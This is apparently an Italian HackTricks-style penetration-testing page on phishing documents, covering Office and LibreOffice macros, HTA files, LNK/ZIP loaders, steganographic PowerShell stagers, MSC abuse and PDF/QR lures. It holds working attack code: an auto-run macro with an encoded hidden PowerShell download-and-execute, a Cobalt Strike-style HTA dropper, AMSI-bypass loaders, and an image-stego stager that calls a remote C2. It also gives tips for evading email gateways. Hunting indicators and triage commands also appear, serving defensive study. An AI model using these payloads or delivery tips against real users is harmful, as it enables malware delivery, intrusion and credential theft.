# File e documenti di phishing

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida dei dati avviene identificando le strutture dei dati in base allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file analizzato non verrà aperto.

Di solito, i file Word contenenti macro utilizzano l'estensione `.docm`. Tuttavia, è possibile rinominare il file modificandone l'estensione e mantenere comunque la capacità di eseguire le macro.\
Ad esempio, un file RTF non supporta le macro per definizione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e sarà in grado di eseguire macro.\
Gli stessi meccanismi interni si applicano a tutti i software della suite Microsoft Office (Excel, PowerPoint ecc.).

Puoi utilizzare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:

```bash
assoc | findstr /i "word excel powerp"
```

I file DOCX che fanno riferimento a un template remoto (File –Options –Add-ins –Manage: Templates –Go) che include macro possono anche “eseguire” macro.

### Caricamento di immagini esterne

Vai a: _Inserisci --> Parti rapide --> Campo_\
_**Categorie**: Collegamenti e riferimenti, **Nomi di campo**: includePicture e **Nome file o URL**:_ http://<ip>/whatever

![Documenti Office - Caricamento di immagini esterne: vai a: Inserisci -- Parti rapide -- Campo](<../../images/image (155).png>)

### Backdoor con macro

È possibile usare le macro per eseguire codice arbitrario dal documento.

#### Funzioni di caricamento automatico

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice per macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Rimuovere manualmente i metadati

Vai a **File > Info > Inspect Document > Inspect Document** per aprire Document Inspector. Fai clic su **Inspect** e poi su **Remove All** accanto a **Document Properties and Personal Information**.

#### Estensione Doc

Al termine, seleziona il menu a discesa **Save as type** e cambia il formato da **`.docx`** a Word 97-2003 **`.doc`**.\
Fallo perché **non puoi salvare macro in un file `.docx`** e l’estensione abilitata alle macro **`.docm`** è **malvista** (ad es. l’icona della miniatura ha un enorme `!` e alcuni gateway web/e-mail le bloccano del tutto). Pertanto, la vecchia estensione **`.doc`** è il miglior compromesso.

#### Generatori di macro malevole

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro di esecuzione automatica LibreOffice ODT (Basic)

I documenti di LibreOffice Writer possono incorporare macro Basic ed eseguirle automaticamente all’apertura del file associando la macro all’evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Una semplice macro reverse shell è simile a questa:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Nota le virgolette doppie (`""`) all'interno della stringa: LibreOffice Basic le usa per effettuare l'escape delle virgolette letterali, quindi i payload che terminano con `...==""")` mantengono bilanciati sia il comando interno sia l'argomento di Shell.

Suggerimenti per la consegna:

- Salva il file come `.odt` e associa la macro all'evento del documento, in modo che venga eseguita immediatamente all'apertura.
- Quando invii un'email con `swaks`, usa `--attach @resume.odt` (`@` è necessario affinché venga inviato come allegato il contenuto del file, non la stringa del nome file). Questo è fondamentale quando si abusano server SMTP che accettano destinatari `RCPT TO` arbitrari senza convalida.

## File HTA

Un HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente e viene eseguito come applicazione con "piena fiducia", senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito tramite **`mshta.exe`**, che in genere viene **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Pertanto, se è stato disinstallato, gli HTA non potranno essere eseguiti.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Schede di allegati false nelle email HTML

Un'email HTML può imitare la scheda di anteprima degli allegati nativa di un provider senza contenere un vero allegato. Talos ha osservato una scheda Gmail ricreata con quattro parti MIME PNG inline codificate in Base64. L'intero elemento visivo era racchiuso in un unico anchor e un valore destinatario in `?m=<target-id>` abilitava il tracking per destinatario. Il link iniziava con `//` anziché `http://` o `https://`: i browser risolvono questa forma relativa al protocollo, ma gli estrattori di URL che rilevano solo URL completamente qualificati potrebbero non individuarla.<sup>[[11]](#references)</sup>

Durante l'analisi, esamina il MIME grezzo invece di fidarti dell'elenco degli allegati visualizzato. Ricostruisci come le parti immagine inline compongono la scheda visiva, individua l'anchor che la racchiude e normalizza i valori `href` relativi al protocollo prima di estrarre gli URL.<sup>[[11]](#references)</sup>

Per testare lo spoofing del mittente dell'envelope/header e l'allineamento DMARC, vedi [Contromisure allo spoofing delle email SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Forzare l'autenticazione NTLM

Esistono diversi modi per **forzare l'autenticazione NTLM "da remoto"**: per esempio, si possono aggiungere **immagini invisibili** alle email o a pagine HTML che l'utente visiterà (anche tramite HTTP MitM?). Oppure inviare alla vittima l'**indirizzo di file** che **attiveranno** un'**autenticazione** semplicemente **aprendo la cartella**.

**Esamina queste idee e altre nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi solo rubare l'hash o le credenziali di autenticazione, ma anche **eseguire attacchi NTLM relay**:

- [**Attacchi NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay verso i certificati)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Loader LNK + payload incorporati in ZIP (catena fileless)

Campagne molto efficaci distribuiscono uno ZIP contenente due documenti esca legittimi (PDF/DOCX) e un file .lnk malevolo. Il trucco consiste nel memorizzare il loader PowerShell vero e proprio nei byte grezzi dello ZIP, dopo un marcatore univoco, e nel fare in modo che il file .lnk lo estragga e lo esegua interamente in memoria.<sup>[[2]](#references)</sup>

Flusso tipico implementato dal one-liner PowerShell del file .lnk:

1) Individuare lo ZIP originale nei percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e nella directory padre della directory di lavoro corrente.
2) Leggere i byte dello ZIP e trovare un marcatore hardcoded (ad es., xFIQCV). Tutto ciò che segue il marcatore è il payload PowerShell incorporato.
3) Copiare lo ZIP in %ProgramData%, estrarlo lì e aprire il file .docx esca per apparire legittimi.
4) Bypassare AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deoffuscare lo stage successivo (ad es., rimuovere tutti i caratteri #) ed eseguirlo in memoria.

Esempio di scheletro PowerShell per estrarre ed eseguire lo stage incorporato:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Note
- La delivery spesso sfrutta sottodomini PaaS affidabili (ad es., *.herokuapp.com) e può applicare controlli ai payload (servire ZIP benigni in base a IP/UA).
- Lo stage successivo spesso decritta shellcode base64/XOR e la esegue tramite Reflection.Emit + VirtualAlloc per ridurre al minimo gli artefatti su disco.

Persistence utilizzata nella stessa catena
- Hijacking di COM TypeLib del controllo Microsoft Web Browser, in modo che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload.<sup>[[2]](#references)[[4]](#references)</sup> Consulta qui i dettagli e i comandi pronti all’uso:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Ricerca/IOC
- File ZIP contenenti la stringa marcatore ASCII (ad es., xFIQCV) aggiunta ai dati dell’archivio.
- File .lnk che enumerano le cartelle genitore/utente per individuare il file ZIP e aprono un documento esca.
- Manomissione di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread di discussione aziendali di lunga durata che terminano con link ospitati sotto domini PaaS affidabili.

## Staging con esca LNK prima di tutto → persistence tramite attività pianificata → side-loading CPL affidabile

Un altro schema ricorrente è un **`.lnk` che si spaccia per un documento** e apre subito un’esca innocua mentre prepara la vera catena in background.<sup>[[3]](#references)</sup>

Flusso osservato:
1. Il collegamento **si spaccia per un PDF** e usa `conhost.exe` o un proxy simile per avviare un downloader PowerShell offuscato.
2. PowerShell frammenta i token evidenti (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), così le rilevazioni ingenue che cercano `iwr`, `gci`, `ren`, `cpi` o `schtasks` non individuano il comando.
3. Lo stager scarica prima il **documento esca**, lo apre per la vittima e poi ricostruisce i file malevoli in background.
4. I payload possono essere scritti con **estensioni fasulle** e poi rinominati rimuovendo i caratteri riempitivi, ritardando la comparsa di artefatti evidenti `.exe` / `.cpl`.
5. La persistence viene stabilita con un’**attività pianificata basata sui minuti** che avvia un binario host affidabile da un percorso scrivibile dall’utente.

Indizi essenziali per la ricerca di questo schema:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Un layout di staging utile da riconoscere è:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Perché il secondo stage è furtivo

Nel case study di Rapid7, l’attività pianificata avviava ripetutamente **`Fondue.exe`** da `C:\Users\Public\`. Poiché **`APPWIZ.cpl`** era stato collocato accanto al file e esportava **`RunFODW`**, il binario Microsoft attendibile eseguiva il side-loading del CPL dell’attaccante invece di caricare la copia legittima del sistema.

Il CPL:
- Legge un blob **AES-256-CBC** da `C:\Windows\Tasks\editor.dat`
- Lo decrittografa tramite **Windows CNG / `bcrypt.dll`**
- Alloca memoria eseguibile e vi copia la shellcode decrittografata
- La esegue indirettamente passando il puntatore alla shellcode come callback di **`EnumUILanguagesW`**

Quest’ultimo passaggio merita di essere cercato separatamente: spesso il malware evita un salto diretto `((void(*)())buf)()` e sfrutta invece una **WinAPI legittima che accetta una callback** per trasferire l’esecuzione.

Il payload decrittografato in questa campagna era shellcode **Donut**, che ha quindi mappato la PE finale interamente in memoria e applicato patch a **AMSI/WLDP/ETW** nel processo corrente prima di cederne l’esecuzione. Per maggiori dettagli sul side-loading e sul post-processing in memoria, vedere:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Indicatori pratici su cui concentrare la ricerca:
- Un `.lnk` che avvia `powershell.exe` o `conhost.exe`, seguito da un documento-esca visibile.
- Download di breve durata in **`C:\Users\Public\`**, seguiti dalla rinomina immediata di file con estensioni senza senso.
- Attività pianificate con nomi generici come `GoogleErrorReport` che eseguono file da **directory scrivibili dagli utenti**.
- Binari attendibili che caricano file **`.cpl` / `.dll`** dalla stessa directory non di sistema.
- Blob di testo Base64 scritti in **`C:\Windows\Tasks\`** e poi letti dal modulo caricato tramite side-loading.

## Payload delimitati tramite steganografia nelle immagini (stager PowerShell)

Le catene di loader recenti distribuiscono JavaScript/VBS offuscati che decodificano e avviano uno stager PowerShell Base64. Lo stager scarica un’immagine (spesso GIF) che contiene una DLL .NET codificata in Base64 e nascosta come testo normale tra marcatori univoci di inizio/fine. Lo script cerca questi delimitatori (esempi osservati in natura: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo compreso tra essi, lo decodifica da Base64 in byte, carica l’assembly in memoria e invoca un metodo di ingresso noto passandogli l’URL C2.<sup>[[5]](#references)</sup>

Flusso di lavoro
- Stage 1: Dropper JS/VBS archiviato → decodifica il Base64 incorporato → avvia lo stager PowerShell con -nop -w hidden -ep bypass.
- Stage 2: Lo stager PowerShell → scarica l’immagine, estrae il Base64 delimitato dai marcatori, carica la DLL .NET in memoria e ne chiama il metodo (ad es. VAI), passandogli l’URL C2 e le opzioni.
- Stage 3: Il loader recupera il payload finale e in genere lo inietta tramite process hollowing in un binario attendibile (comunemente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Per saperne di più sul process hollowing e sull’esecuzione tramite proxy di utility attendibili, vedere:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un’immagine e invocare in memoria un metodo .NET:

<details>
<summary>Estrattore e loader PowerShell per payload steganografici</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Note
- Questo è ATT&CK T1027.003 (steganografia/nascondimento di marker).<sup>[[6]](#references)</sup> I marker variano a seconda delle campagne.
- AMSI/ETW bypass e deoffuscamento delle stringhe vengono comunemente applicati prima di caricare l'assembly.
- Hunting: scansionare le immagini scaricate alla ricerca di delimitatori noti; identificare PowerShell che accede alle immagini e decodifica immediatamente blob Base64.

Vedi anche gli strumenti stego e le tecniche di carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging di PowerShell tramite Base64

Una fase iniziale ricorrente consiste in un piccolo file `.js` o `.vbs`, pesantemente offuscato e distribuito all'interno di un archivio. Il suo unico scopo è decodificare una stringa Base64 incorporata e avviare PowerShell con `-nop -w hidden -ep bypass` per predisporre la fase successiva tramite HTTPS.<sup>[[5]](#references)</sup>

Logica schematica (astratta):
- Leggere il contenuto del file stesso
- Individuare un blob Base64 tra stringhe di riempimento
- Decodificarlo in PowerShell ASCII
- Eseguirlo con `wscript.exe`/`cscript.exe` che invoca `powershell.exe`

Indicatori per l'hunting
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella riga di comando.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temporanei dell'utente.

## Documenti MSC come contenitori di esecuzione (GrimResource)

I file Microsoft Management Console (`.msc`) sono definizioni XML di console normalmente aperte da `mmc.exe`. **GrimResource** arma un riferimento `StringTable` a una risorsa `apds.dll` contenente una vecchia primitiva XSS, così che l'apertura della console appositamente creata da parte di un utente provochi l'esecuzione di JavaScript all'interno di `mmc.exe`. I campioni osservati combinavano l'offuscamento basato su `transformNode` con **DotNetToJScript** per istanziare un payload .NET senza ricorrere al consueto percorso delle macro di Office.<sup>[[9]](#references)</sup>

Per il triage statico, trattare un MSC non attendibile come testo e **non** aprirlo con un doppio clic:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

I pivot runtime ad alto segnale includono `mmc.exe` che carica il CLR o componenti script, crea connessioni di rete oppure avvia `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` o un eseguibile inatteso. Il formato è legittimo, quindi i rilevamenti dovrebbero correlare **origine + contenuto XML/script sospetto + comportamento di `mmc.exe`** invece di bloccare ogni MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirector e gating del payload

Un PDF non ha bisogno di un exploit per essere utile. Le campagne recenti inseriscono un **codice QR o un normale link** in un documento dall’aspetto innocuo, spostano la sessione del browser al di fuori dei controlli della posta e personalizzano la destinazione con l'indirizzo del destinatario. Microsoft ha documentato PDF del 2025 i cui URL QR erano unici per destinatario e conducevano a un'infrastruttura di credential harvesting di RaccoonO365; una catena parallela usava il gating basato su IP/ambiente per restituire un percorso JavaScript/MSI a visitatori selezionati, ma un PDF innocuo a scanner o client non autorizzati.<sup>[[10]](#references)</sup>

Esamina sia le azioni PDF sia i codici QR renderizzati. Un QR può essere disegnato come vettore invece di essere memorizzato come immagine estraibile, quindi rasterizza ogni pagina oltre a estrarre le immagini incorporate:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Esamina le destinazioni decodificate e i redirect da un sistema di analisi isolato, senza autenticarti. Tra gli indicatori utili da cercare ci sono PDF contenenti solo QR code con il corpo dell’email quasi vuoto, l’indirizzo email del destinatario incorporato in un parametro della query, diversi redirect attraverso servizi di hosting affidabili e contenuti diversi restituiti in base a IP, geolocalizzazione, cookie, referrer o user agent. Confronta le richieste usando profili controllati, perché una singola richiesta del sandbox potrebbe ricevere solo il contenuto esca.<sup>[[10]](#references)</sup>

## File Windows per sottrarre hash NTLM

Consulta la pagina sui **luoghi da cui sottrarre credenziali NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro di LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagna ZipLine: un sofisticato attacco di phishing mirato alle aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: tracciamento delle tecniche operative di Dropping Elephant attraverso una catena di loader a tema cinese](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Il loader PhantomVAI distribuisce diversi infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console per l’accesso iniziale e l’elusione](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Gli attori delle minacce sfruttano il periodo delle dichiarazioni dei redditi per diffondere campagne di phishing a tema fiscale](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Catena di distribuzione di UAT-11587 e backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
